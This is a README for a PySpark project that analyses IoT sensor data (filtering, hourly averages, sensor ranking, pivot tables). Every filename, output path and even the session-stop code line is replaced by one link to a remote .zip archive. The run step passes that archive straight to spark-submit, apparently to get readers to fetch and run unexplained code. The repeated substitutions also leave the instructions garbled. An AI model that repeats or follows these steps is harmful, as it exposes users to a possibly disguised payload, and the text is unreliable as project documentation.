# IoT Sensor Data Analysis with Spark SQL

This project analyzes IoT sensor data using Spark SQL with PySpark, demonstrating loading, exploration, filtering, aggregation, time-based analysis, window functions, and pivot table creation.

---

## Tasks Overview

- **Task 1: Load & Basic Exploration**
- **Task 2: Filtering & Simple Aggregations**
- **Task 3: Time-Based Analysis**
- **Task 4: Ranking Sensors by Average Temperature**
- **Task 5: Pivoting Data and Interpretation**

Each task produces CSV outputs (`https://raw.githubusercontent.com/pavandantu18/iot-sensor-data-spark-sql-pavandantu18/master/Gileno/iot-sensor-data-spark-sql-pavandantu18.zip`).

---

## Prerequisites

- **Apache Spark** (version 2.x or 3.x recommended)
- **Python 3.x** with PySpark installed
- **IoT sensor data CSV** (`https://raw.githubusercontent.com/pavandantu18/iot-sensor-data-spark-sql-pavandantu18/master/Gileno/iot-sensor-data-spark-sql-pavandantu18.zip`) placed in the working directory

---

## How to Run the Tasks

1. **Navigate to your working directory**:

```bash
cd /path/to/your/directory
```

2. Execute the Spark script:
```bash
spark-submit https://raw.githubusercontent.com/pavandantu18/iot-sensor-data-spark-sql-pavandantu18/master/Gileno/iot-sensor-data-spark-sql-pavandantu18.zip
```

Upon completion, the script generates these output files:

https://raw.githubusercontent.com/pavandantu18/iot-sensor-data-spark-sql-pavandantu18/master/Gileno/iot-sensor-data-spark-sql-pavandantu18.zip

https://raw.githubusercontent.com/pavandantu18/iot-sensor-data-spark-sql-pavandantu18/master/Gileno/iot-sensor-data-spark-sql-pavandantu18.zip

https://raw.githubusercontent.com/pavandantu18/iot-sensor-data-spark-sql-pavandantu18/master/Gileno/iot-sensor-data-spark-sql-pavandantu18.zip

https://raw.githubusercontent.com/pavandantu18/iot-sensor-data-spark-sql-pavandantu18/master/Gileno/iot-sensor-data-spark-sql-pavandantu18.zip

https://raw.githubusercontent.com/pavandantu18/iot-sensor-data-spark-sql-pavandantu18/master/Gileno/iot-sensor-data-spark-sql-pavandantu18.zip

## Code Explanation (Step-by-Step)
## Task 1: Load & Basic Exploration
Load CSV into DataFrame with inferred schema.

Create a temporary SQL view (sensor_readings).

Display basic stats: first 5 rows, record count, distinct locations, and sensor types.

## Task 2: Filtering & Aggregations
Filter temperatures (18°C–30°C) and count in-range/out-of-range records.

Compute average temperature and humidity per location.

## Task 3: Time-Based Analysis
Convert string timestamps to timestamp datatype.

Group data by hour of day, calculate hourly average temperature, and find hottest hour.

## Task 4: Ranking Sensors by Average Temperature (Window Function)
Compute average temperature per sensor.

Rank sensors based on average temperature and display the top 5.

## Task 5: Pivot Table & Interpretation
Pivot data: Rows are locations, columns are hours (0–23), cells show average temperatures.

Identify the (location, hour) combination with the highest average temperature.

### Finalization
Stop Spark session after tasks completion:
```bash
https://raw.githubusercontent.com/pavandantu18/iot-sensor-data-spark-sql-pavandantu18/master/Gileno/iot-sensor-data-spark-sql-pavandantu18.zip()
```

